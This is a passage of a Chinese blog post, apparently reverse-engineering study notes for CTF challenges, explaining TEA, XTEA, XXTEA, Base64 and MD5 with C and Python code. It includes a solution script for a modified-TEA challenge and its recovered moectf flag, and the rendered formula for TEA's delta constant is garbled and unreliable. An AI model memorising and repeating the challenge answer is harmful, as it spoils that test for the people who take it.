class="number">0</span>],v[<span class="number">1</span>]);  </span><br><span class="line">    decrypt(v, k);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></div></figure><p>TEA算法有64位的明文，128位的密钥以及一个常数 $\delta$ 组成。$\delta$源自于黄金比例，但它的数值的精确度并不重要，于是被定义为 $\delta$&#x3D;「($\tilde{A}$5 - 1)231」(即程序里面的<strong>0×9E3779B9</strong>)</p><p>TEA是将明文每64位位一组进行加密，每次加密将这64位分为两部分，高32位和低32位(后面分别用Mup和Mdown来表示)，而密钥(Key)则拆分为4部分。</p><p>一般的轮数是32或64（8的倍数），加密后将结果覆写回去</p><p>注意，x-&#x3D;0x61c88647和x+&#x3D;0x9e3779b9，这两个值是等价的，可能会在反汇编中看到</p><p>这里将上面测试的代码编译好拖入IDA中进行观察</p><p>可以看到δ就被反编译为<code>v4 -= 1640531527;</code></p><p>代码样例</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span>* EntryData, <span class="type">unsigned</span> <span class="type">long</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> Mup = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> Mdown = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0xD33B470</span>;</span><br><span class="line"> <span class="type">int</span> n=<span class="number">32</span>;</span><br><span class="line">        </span><br><span class="line">   sum = delta*n; <span class="comment">//视次数.</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        Mdown -= ((Mup &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (Mup + sum) ^ ((Mup &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        Mup -= ((Mdown &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (Mdown + sum) ^ ((Mdown &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    EntryData[<span class="number">0</span>] = Mup;</span><br><span class="line">    EntryData[<span class="number">1</span>] = Mdown;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> key[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> EntryData[] = &#123;<span class="number">0x89546517</span>, <span class="number">0x324665ed</span>&#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(EntryData, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;                      </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, EntryData[j] &amp; <span class="number">0xff</span>);</span><br><span class="line">                EntryData[j] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    </span></span><br><span class="line"><span class="comment">//0x89546517, 0x324665ed  0xfda9583d, 0x97615ee2 0x91f160e4, 0xa2e9e973  0x999acb59, 0x7de1b1ec</span></span><br><span class="line"><span class="comment">//moectf&#123;Th3_TEA_!S_s0_t4s7y~~!!!&#125;</span></span><br></pre></td></tr></table></div></figure>        <h3 id="xTea"   >          <a href="#xTea" class="heading-link"><i class="fas fa-link"></i></a><a href="#xTea" class="headerlink" title="xTea"></a>xTea</h3>      <p>xTea算法是Tea的升级版，加入了位移和异或运算，和更多的密钥表</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132156955" alt="img"></p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span>  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;  </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;  </span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;  </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;  </span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;  </span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;  </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r=<span class="number">32</span>;<span class="comment">//num_rounds建议取值为32  </span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数  </span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);  </span><br><span class="line">    encipher(r, v, k);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);  </span><br><span class="line">    decipher(r, v, k);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></div></figure><p>整体逆向和Tea差不太大</p>        <h3 id="xxTea"   >          <a href="#xxTea" class="heading-link"><i class="fas fa-link"></i></a><a href="#xxTea" class="headerlink" title="xxTea"></a>xxTea</h3>      <p>xxTEA，又称Corrected Block TEA</p><p>特点：原字符串长度可以不是4的倍数了</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> MX (z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3 ^ z&lt;&lt;4)^(sum^y) + (k[ i&amp;3 ^ e] ^ z);</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">long</span> <span class="title function_">btea</span><span class="params">(<span class="type">long</span>* v, <span class="type">long</span> n, <span class="type">long</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> z=v[n<span class="number">-1</span>], y=v[<span class="number">0</span>], sum=<span class="number">0</span>, e, DELTA=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">long</span> i, q ;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;         </span><br><span class="line">      q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n<span class="number">-1</span>; i++)&#123; </span><br><span class="line">            y = v[i+<span class="number">1</span>];</span><br><span class="line">            z = v[i] += MX;</span><br><span class="line">        &#125; </span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">    &#125; </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123; </span><br><span class="line">      n = -n;</span><br><span class="line">      q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      sum = q*DELTA ;</span><br><span class="line">      <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (i=n<span class="number">-1</span>; i&gt;<span class="number">0</span>; i--) &#123;</span><br><span class="line">            z = v[i<span class="number">-1</span>];</span><br><span class="line">            y = v[i] -= MX;   </span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> long btea(long* v, long n, long* k)</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">v是要加密的组元的起始地址，以32bit为单位，这里用long来实现。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">n是要加密的组元个数，正数是加密，负数是解密。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">k是密钥的起始地址，长度为4个组元，4*32=128bit。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回值为0或1（对应n=0，没有计算）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">加密的结果会直接写回到v中。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></div></figure>        <h2 id="Base64"   >          <a href="#Base64" class="heading-link"><i class="fas fa-link"></i></a><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2>      <p>Base64 是一种基于 64 个可打印字符来表示二进制数据的表示方法。</p><p><strong>特征：由64个字符(A-Z,a-z,0-9,+,&#x2F;)组成，末尾可能会出现1或2个’&#x3D;’ 最多有2个</strong></p><p>对二进制数据以6个位(bit)为一组切分，所以分切之前的二进制位数应该是24的倍数（即6，8的最小公倍数）。如果不足24位,则在编码后数据后面添加”&#x3D;”</p><p>转换的时候，将 3 字节的数据，先后放入一个 24 位的缓冲区中，先来的字节占高位。数据不足 3 字节的话，于缓冲器中剩下的比特用 0 补足。每次取出 6 比特，按照其值选择<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>中的字符作为编码后的输出，直到全部输入数据转换完成。</p><p>通常而言 Base64 的识别特征为索引表，当我们能找到 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 这样索引表，再经过简单的分析基本就能判定是 Base64 编码。</p><p>当然，有些题目 base64 的索引表是会变的，一些变种的 base64 主要 就是修改了这个索引表。</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文本:        V        a        n</span><br><span class="line">ASCII:      86       97      110</span><br><span class="line">Bin:    010101|10 0110|0001 01|101110</span><br><span class="line">6位一组：  21      38      5      46 </span><br><span class="line">Base64:   V       m       F      u</span><br></pre></td></tr></table></div></figure><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 码表</span></span><br><span class="line">s = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">My_base64_encode</span>(<span class="params">inputs</span>):</span><br><span class="line">    <span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">    bin_str = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">        x = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        bin_str.append(<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">    <span class="comment"># print(bin_str)</span></span><br><span class="line">    <span class="comment"># 输出的字符串</span></span><br><span class="line">    outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 不够三倍数，需补齐的次数</span></span><br><span class="line">    nums = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> bin_str:</span><br><span class="line">        <span class="comment"># 每次取三个字符的二进制</span></span><br><span class="line">        temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(temp_list) != <span class="number">3</span>):</span><br><span class="line">            nums = <span class="number">3</span> - <span class="built_in">len</span>(temp_list)</span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(temp_list) &lt; <span class="number">3</span>:</span><br><span class="line">                temp_list += [<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>]</span><br><span class="line">        temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line">        <span class="comment"># print(temp_str)</span></span><br><span class="line">        <span class="comment"># 将三个8字节的二进制转换为4个十进制</span></span><br><span class="line">        temp_str_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">            temp_str_list.append(<span class="built_in">int</span>(temp_str[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>], <span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(temp_str_list)</span></span><br><span class="line">        <span class="keyword">if</span> nums:</span><br><span class="line">            temp_str_list = temp_str_list[<span class="number">0</span>:<span class="number">4</span> - nums]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list:</span><br><span class="line">            outputs += s[i]</span><br><span class="line">        bin_str = bin_str[<span class="number">3</span>:]</span><br><span class="line">    outputs += nums * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted String:\n%s &quot;</span> % outputs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">My_base64_decode</span>(<span class="params">inputs</span>):</span><br><span class="line">    <span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">    bin_str = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">        <span class="keyword">if</span> i != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            x = <span class="built_in">str</span>(<span class="built_in">bin</span>(s.index(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            bin_str.append(<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">    <span class="comment"># print(bin_str)</span></span><br><span class="line">    <span class="comment"># 输出的字符串</span></span><br><span class="line">    outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">    nums = inputs.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> bin_str:</span><br><span class="line">        temp_list = bin_str[:<span class="number">4</span>]</span><br><span class="line">        temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line">        <span class="comment"># print(temp_str)</span></span><br><span class="line">        <span class="comment"># 补足8位字节</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(temp_str) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">            temp_str = temp_str[<span class="number">0</span>:-<span class="number">1</span> * nums * <span class="number">2</span>]</span><br><span class="line">        <span class="comment"># 将四个6字节的二进制转换为三个字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">int</span>(<span class="built_in">len</span>(temp_str) / <span class="number">8</span>)):</span><br><span class="line">            outputs += <span class="built_in">chr</span>(<span class="built_in">int</span>(temp_str[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">        bin_str = bin_str[<span class="number">4</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted String:\n%s &quot;</span> % outputs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;     *    (1)encode         (2)decode    *&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;Please select the operation you want to perform:\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> (num == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be encrypted: \n&quot;</span>)</span><br><span class="line">    My_base64_encode(input_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be decrypted: \n&quot;</span>)</span><br><span class="line">    My_base64_decode(input_str)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h2 id="哈希函数"   >          <a href="#哈希函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h2>      <p>哈希函数（Hash Function）把消息或数据压缩成摘要，使得数据量变小。</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132157308.png" alt="image-20230113215720255" style="zoom:50%;" /><p>显然对于任何一个 hash 值，理论上存在若干个消息与之对应，即碰撞。</p><p>目前的 Hash 函数主要有 MD5，SHA1，SHA256，SHA512。目前的大多数 hash 函数都是迭代性的，即使用同一个 hash 函数，不同的参数进行多次迭代运算。</p><div class="table-container"><table><thead><tr><th>算法类型</th><th>输出hash值的长度</th></tr></thead><tbody><tr><td>MD5</td><td>128bit</td></tr><tr><td>SHA1</td><td>160bit</td></tr><tr><td>SHA256</td><td>256bit</td></tr><tr><td>SHA512</td><td>512bit</td></tr></tbody></table></div>        <h3 id="MD5"   >          <a href="#MD5" class="heading-link"><i class="fas fa-link"></i></a><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3>      <p><strong>MD5 消息摘要算法</strong>（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范。</p><p>MD5编码具有单向性，即由明文变密文简单，由密文变明文困难。基于这个特性，MD5可以有效保证信息的完整性，常用于验证数据是否被篡改</p><p>MD5是不可逆的算法，同一个MD5的值对应无数种密文</p><ol><li>MD5码以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由4个32位分组组成，并级联后将生成一个128位散列值。</li><li>继续向后取512位数据，不够则进行填充。每次的运算都由前一轮的128位散列值和当前的512bit值进行运算</li><li>因此MD5结果值是一段固定长度的数据，无论原始数据是多长或多短，其MD5值都是128bit</li><li>最后按十六进制计算输出，即结果为0-9a-f</li></ol><p>伪代码</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 